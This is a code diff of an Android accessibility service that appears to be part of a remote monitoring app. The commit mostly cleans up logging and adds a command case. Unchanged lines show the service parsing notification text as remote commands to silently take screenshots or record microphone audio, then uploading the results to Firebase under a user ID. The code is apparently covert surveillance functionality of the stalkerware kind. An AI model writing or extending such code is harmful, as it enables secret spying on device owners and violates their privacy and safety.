@@ -38,7 +38,7 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
     private static final int RECORDER_SAMPLERATE = 8000;
     private MediaRecorder recorder;
 
-    String TAG = "ijsfnidshf";
+    String TAG = "AccessibilityService.logs";
 
     FirebaseDatabase mdb;
     DatabaseReference reference;
@@ -80,11 +80,9 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
                                 String UserID = save.getString("UserID", "");
 
                                 int message = Integer.parseInt(notification.extras.getString("android.text"));
-                                Log.d(TAG, title);
                                 switch (message) {
                                     case 1:
                                         takeScreenshots(UserID);
-                                        Log.d(TAG, String.valueOf(message));
                                         instance = accessibilityService.this;
                                         updateAccessibility();
                                         break;
@@ -93,6 +91,10 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
                                         final Handler handler = new Handler(Looper.getMainLooper());
                                         startRecording();
                                         handler.postDelayed(() -> stopRecording(UserID), value);
+                                        instance = accessibilityService.this;
+                                        updateAccessibility();
+                                        break;
+                                    case 3:
                                         instance = accessibilityService.this;
                                         updateAccessibility();
                                         break;
@@ -106,11 +108,9 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
                 if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Back")) {
                     Log.d(TAG, "back");
                     instance = this;
-                    updateAccessibility();
                 } else if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Home")) {
                     Log.d(TAG, "home");
                     instance = this;
-                    updateAccessibility();
                 }
             }
     }
@@ -147,7 +147,6 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
 
     public void takeScreenshots(String UserID) {
 
-        Log.d(TAG, UserID+"tfggygyg");
         mdb = FirebaseDatabase.getInstance();
         reference = mdb.getReference().child("Main").child(UserID).child("Screenshot").child("listener");
 
@@ -163,9 +162,8 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
                             taskSuccess.setMessage("Screenshot captured");
                             taskSuccess.setSuccess(true);
                             reference.setValue(taskSuccess);
-                            Log.i("ScreenShotResult", "onSuccess");
+                            Log.i(TAG, "onSuccess");
                             Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshotResult.getHardwareBuffer(), screenshotResult.getColorSpace());
-                            Log.d(TAG, String.valueOf(bitmap));
 
                             saveBitmap saveBitmap = new saveBitmap(bitmap, accessibilityService.this, reference, taskSuccess);
                             String filename = getRandom.getRandom(0, 1000000000) + ".png";
@@ -179,7 +177,7 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
                             taskSuccess.setSuccess(false);
                             taskSuccess.setFinal(true);
                             reference.setValue(taskSuccess);
-                            Log.i("ScreenShotResult", "onFailure code is " + i);
+                            Log.i(TAG, "onFailure code is " + i);
 
                         }
                     });
@@ -199,7 +197,6 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
             recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
             recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
             recorder.setAudioSamplingRate(RECORDER_SAMPLERATE);
-            Log.e(TAG, "test");
 
             final String filePath = this.getFilesDir() + "/Audios/" + "check" + ".mp3";
             final File file = new File(filePath);
@@ -252,7 +249,6 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
                     AudiosDownloadUrl downloadUrl = new AudiosDownloadUrl(uri.toString(), filename, currentTime);
                     collectionReference.set(downloadUrl).addOnSuccessListener(reference1 -> {
                         filePath.delete();
-                        Log.d(TAG, String.valueOf(reference1));
                     });
                 });
             }
